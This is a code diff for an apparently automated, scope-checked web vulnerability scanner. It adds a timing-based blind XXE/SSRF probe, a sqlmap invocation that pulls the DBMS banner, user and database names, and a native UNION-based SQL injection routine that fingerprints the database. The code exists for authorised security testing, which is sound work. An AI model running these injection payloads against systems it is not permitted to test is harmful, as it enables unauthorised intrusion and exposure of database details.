@@ -1732,8 +1732,17 @@ class ToolRegistry:
                         page.on("dialog", lambda d: asyncio.ensure_future(on_dialog(d)))
                         page.on("framenavigated", lambda fr: navs.append(fr.url))
                         try:
-                            await page.goto(probe["nav"], wait_until="load", timeout=8000)
-                            await page.wait_for_timeout(350)
+                            await page.goto(probe["nav"], wait_until="load", timeout=9000)
+                            # CSTI needs the client-side template engine (AngularJS) to bootstrap
+                            # and run a digest before {{7*7}} becomes 49 — wait for network idle.
+                            if probe["class"] == "csti":
+                                try:
+                                    await page.wait_for_load_state("networkidle", timeout=5000)
+                                except Exception:
+                                    pass
+                                await page.wait_for_timeout(900)
+                            else:
+                                await page.wait_for_timeout(350)
                         except Exception:
                             pass
                         pp_value, body = None, ""
@@ -1742,7 +1751,11 @@ class ToolRegistry:
                         except Exception:
                             pass
                         try:
-                            body = await page.evaluate("document.documentElement.innerText")
+                            # read full HTML for CSTI (the evaluated marker can land in markup,
+                            # not just visible text); innerText is enough for the other classes.
+                            body = await page.evaluate(
+                                "document.documentElement.outerHTML" if probe["class"] == "csti"
+                                else "document.documentElement.innerText")
                         except Exception:
                             pass
                         f = dom.build_finding({**probe, "base": url}, pp_value=pp_value,
@@ -2486,6 +2499,52 @@ class ToolRegistry:
                 if inter:
                     findings.append(xxe.oob_finding(url, purl, inter))
                 collab.clear(token)
+            # 3) timing-based blind XXE → SSRF: an external SYSTEM entity pointed at a
+            # black-hole host stalls the response (the server made the outbound request).
+            # Non-destructive — the target is a reserved TEST-NET IP that routes nowhere.
+            if not any(f.get("confidence") == "confirmed" for f in findings):
+                import time as _time
+
+                async def _timed(body: str, to: float = 12.0) -> float:
+                    t0 = _time.perf_counter()
+                    try:
+                        await c.post(url, headers=headers, content=body.encode(),
+                                     timeout=httpx.Timeout(to))
+                    except Exception:
+                        pass
+                    return _time.perf_counter() - t0
+
+                base_body = sample or "<data><productId>1</productId><storeId>1</storeId></data>"
+                b1 = await _timed(base_body)
+                b2 = await _timed(base_body)
+                baseline = min(b1, b2)
+                blackhole = "http://192.0.2.1:9/"          # TEST-NET-1 (RFC5737), unroutable → connect hang
+                # Two entity forms — try both so a parser that blocks one is still probed:
+                #   • general entity referenced inside an element (&xxe;) — this is accepted
+                #     even when the parser rejects parameter entities ("Entities are not
+                #     allowed for security reasons"), the common hardened default;
+                #   • parameter entity in the internal subset — for parsers that allow those.
+                stall_body, stall_dt, stall_kind = None, 0.0, ""
+                for kind, body in (("general entity (&xxe; in element)", xxe.build_inband_xml(blackhole, sample)),
+                                   ("parameter entity (internal subset)", xxe.build_oob_xml(blackhole, sample))):
+                    dt = await _timed(body)
+                    if baseline < 1.8 and (dt - baseline) > 3.0:
+                        stall_body, stall_dt, stall_kind = body, dt, kind
+                        break
+                if stall_body is not None:
+                    findings.append(self._attach_poc({
+                        "severity": "high", "cwe": "CWE-611", "target": url,
+                        "title": "Blind XXE → SSRF (external entity dereference, timing-confirmed)",
+                        "confidence": "confirmed", "family": "xxe", "tags": ["xxe", "ssrf", "blind"],
+                        "evidence": (f"An external SYSTEM entity ({stall_kind}) pointed at an unreachable host stalled "
+                                     f"the response: baseline {baseline:.2f}s vs external-entity {stall_dt:.2f}s — the "
+                                     f"server dereferenced the attacker-controlled entity (outbound request → SSRF)."),
+                        "impact": ("The server can be coerced into outbound requests (SSRF), reaching internal-only "
+                                   "services or cloud metadata; depending on parser config, local files may be read."),
+                        "false_positive_check": (f"Two fast baselines ({b1:.2f}s, {b2:.2f}s) versus the external-entity "
+                                                 f"delay ({stall_dt:.2f}s) isolate the entity fetch as the cause of the stall."),
+                    }, url, None, method="POST", body=stall_body,
+                        timing=f"baseline≈{baseline:.2f}s vs external-entity≈{stall_dt:.2f}s"))
         if self.mission_id and findings:
             await self._http(url, "POST", {"Content-Type": ctype}, body=sample or "<root/>", capture=True)
         conf = sum(1 for f in findings if f.get("confidence") == "confirmed")
@@ -2577,8 +2636,170 @@ class ToolRegistry:
 
         if self.mission_id and ev:
             await self._http(ev[0], "GET", capture=True)
+        # DB-METADATA ENRICHMENT: a CONFIRMED native SQLi gets read-only DB proof
+        # (version/current user/schema/database) attached — data-plane depth on the exact
+        # injectable endpoint, WITHOUT the deep planner-wide sqlmap fan-out. deep/insane only.
+        # Native UNION extraction first (deterministic, reliable); sqlmap as the fallback for
+        # non-UNION (boolean/time-based) injections. Both are strictly read-only.
+        if findings and getattr(self, "intensity", "standard") in ("deep", "insane"):
+            _tgt = findings[0].get("target") or url
+            proof, settings = await self._sqli_db_metadata(_tgt)
+            if not proof:
+                proof, settings = await self._sqlmap_enrich(_tgt)
+            if proof:
+                findings[0]["evidence"] = ((findings[0].get("evidence") or "")
+                                           + "\n\nDatabase access (read-only — no data dumped): " + proof).strip()
+                findings[0]["database_proof"] = proof
+                findings[0]["severity"] = "critical"          # data-plane access confirmed
+                findings[0]["settings"] = ((findings[0].get("settings") or "sqli oracle")
+                                           + " ; enrich: " + settings).strip(" ;")
         return ToolResult("sqli", url, True,
                           f"tested {len(params)} param(s), {len(findings)} confirmed SQLi", findings)
+
+    async def _sqlmap_enrich(self, url: str) -> tuple:
+        """Read-only DB-metadata extraction for a CONFIRMED SQLi: run sqlmap on the exact
+        injectable URL and pull whatever it proves — injection techniques, back-end DBMS
+        (confirmed or heuristic), banner, current user/db, database names. NEVER --dump
+        (no data theft). Attaches what actually landed, never fabricates. Returns
+        (proof_string, settings) or ('', '')."""
+        import re as _re
+        cmd = ["sqlmap", "-u", url, "--batch", "--flush-session", "--random-agent",
+               "--technique", "BEU", "--level", "3", "--risk", "2",
+               "--current-user", "--current-db", "--banner", "--dbs"]
+        _hdrs = self.session_headers or {}
+        _ck = _hdrs.get("Cookie") or _hdrs.get("cookie")
+        if _ck:
+            cmd += ["--cookie", _ck]
+        out, err = await self._cmd(cmd, timeout=420)
+        if err.startswith("__MISSING__") or (
+                "is vulnerable" not in out and "sqlmap identified" not in out and "the following injection" not in out):
+            return "", ""
+        proof = _parse_sqlmap_proof(out)                 # parameter, techniques, payloads, DBMS
+        parts = []
+        dbms = proof.get("dbms") or ""
+        if not dbms:
+            h = _re.search(r"back-end DBMS could be '([^']+)'", out)
+            if h:
+                dbms = h.group(1).strip() + " (heuristic)"
+        if dbms:
+            parts.append(f"DBMS={dbms}")
+        for lbl, key in (("banner", "banner"), ("current user", "current_user"),
+                         ("current database", "current_db")):
+            m = _re.search(lbl + r":\s*'([^'\n\r]+)'", out)
+            if m:
+                parts.append(f"{key}={m.group(1).strip()}")
+        mdb = _re.search(r"available databases \[\d+\]:\s*((?:\s*\[\*\][^\n]+\n?)+)", out)
+        if mdb:
+            names = [n.strip() for n in _re.findall(r"\[\*\]\s*([^\n\r]+)", mdb.group(1))]
+            if names:
+                parts.append("databases=" + ",".join(names[:8]))
+        if proof.get("types"):
+            parts.append("techniques=" + "; ".join(proof["types"][:4]))
+        settings = " ".join(cmd[3:])
+        if not parts:
+            return ("sqlmap independently confirmed the injection point (read-only)", settings)
+        return " | ".join(parts), settings
+
+    async def _sqli_db_metadata(self, url: str) -> tuple:
+        """Native UNION-based read-only DB-metadata extraction for a CONFIRMED SQLi.
+        Reflects DB version / current user / current schema / database through the
+        vulnerable UNION column and reads them back — SELECT-only, never touches user
+        tables, never writes. The marker is assembled by the DB from CHAR() codes (so it
+        is ABSENT from the request text), and a 2+2=4 sanity check proves the value came
+        from SQL EXECUTION, not input reflection. Deterministic and far more reliable
+        than a DBMS fingerprint. Returns (proof, settings) or ('', ''). Non-destructive."""
+        import httpx
+        from urllib.parse import parse_qsl
+        params = xt.params_of(url)
+        if not params:
+            return "", ""
+        qvals = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
+        headers = {"User-Agent": _UA, **(self.session_headers or {})}
+
+        def _chars(tag):
+            return [f"CHAR({ord(ch)})" for ch in tag]
+
+        def marker(tag, mode):                        # DB-assembled token (not in the request text)
+            cc = _chars(tag)
+            return "||".join(cc) if mode == "pipe" else "CONCAT(" + ",".join(cc) + ")"
+
+        def concat3(a, mid, b, mode):
+            return f"{a}||{mid}||{b}" if mode == "pipe" else f"CONCAT({a},{mid},{b})"
+
+        def cast(fn, mode):
+            return f"CAST(({fn}) AS {'VARCHAR' if mode == 'pipe' else 'CHAR'})"
+
+        def unhtml(s):
+            return (s.replace("&apos;", "'").replace("&quot;", '"')
+                     .replace("&amp;", "&").replace("&#39;", "'"))
+
+        async with httpx.AsyncClient(verify=False, follow_redirects=True,
+                                     headers=headers, timeout=25) as c:
+            async def q(p, payload):
+                t = xt.set_param(url, p, payload)
+                if not self.scope.validate(t)[0]:
+                    return 0, ""
+                try:
+                    r = await c.get(t)
+                    return r.status_code, r.text
+                except Exception:
+                    return 0, ""
+
+            for p in params[:3]:
+                orig = qvals.get(p, "1") or "1"
+                for mode in ("pipe", "concat"):        # || (H2/PG/Oracle/SQLite) then CONCAT() (MySQL)
+                    # ── column count: a well-formed UNION SELECT NULL×n stops erroring ──
+                    widths = []
+                    for n in range(1, 14):
+                        st, _ = await q(p, f"{orig}' UNION ALL SELECT {','.join(['NULL'] * n)}-- -")
+                        if st and st < 400:
+                            widths.append(n)
+                    # ── reflected column: CHAR-marker per position (numeric cols reject it) ──
+                    found = None
+                    for n in widths[:4]:
+                        for pos in range(n):
+                            tag = f"QZ{chr(65 + pos)}7"
+                            row = ["NULL"] * n
+                            row[pos] = marker(tag, mode)
+                            _, body = await q(p, f"{orig}' UNION ALL SELECT {','.join(row)}-- -")
+                            if body and tag in unhtml(body):
+                                found = (n, pos)
+                                break
+                        if found:
+                            break
+                    if not found:
+                        continue
+                    n, pos = found
+                    B = marker("QZX7", mode)           # boundary the DB assembles around each value
+
+                    async def extract(fn):
+                        row = ["NULL"] * n
+                        row[pos] = concat3(B, cast(fn, mode), B, mode)
+                        _, body = await q(p, f"{orig}' UNION ALL SELECT {','.join(row)}-- -")
+                        if not body:
+                            return None
+                        m = re.search(r"QZX7(.*?)QZX7", unhtml(body), re.S)
+                        v = m.group(1).strip() if m else None
+                        return v if (v and 0 < len(v) < 256 and v.upper() != "NULL") else None
+
+                    if await extract("2+2") != "4":     # DB isn't evaluating here -> wrong point/mode
+                        continue
+                    fields = (("version", ("H2VERSION()", "VERSION()", "version()", "@@VERSION")),
+                              ("current user", ("CURRENT_USER", "CURRENT_USER()", "USER()", "SYSTEM_USER", "USER")),
+                              ("current schema", ("SCHEMA()", "CURRENT_SCHEMA", "CURRENT_SCHEMA()")),
+                              ("database", ("DATABASE()", "CURRENT_CATALOG", "DB_NAME()")))
+                    parts = []
+                    for label, cands in fields:
+                        for fn in cands:
+                            v = await extract(fn)
+                            if v:
+                                parts.append(f"{label}={v}")
+                                break
+                    if parts:
+                        settings = (f"native UNION extraction via '{p}' "
+                                    f"({n} columns, reflected column {pos + 1}, {mode} concat)")
+                        return " | ".join(parts), settings
+        return "", ""
 
     async def _run_auth_sqli(self, inp: dict) -> ToolResult:
         """POST/JSON body auth-bypass SQLi on a login-style endpoint — the injection
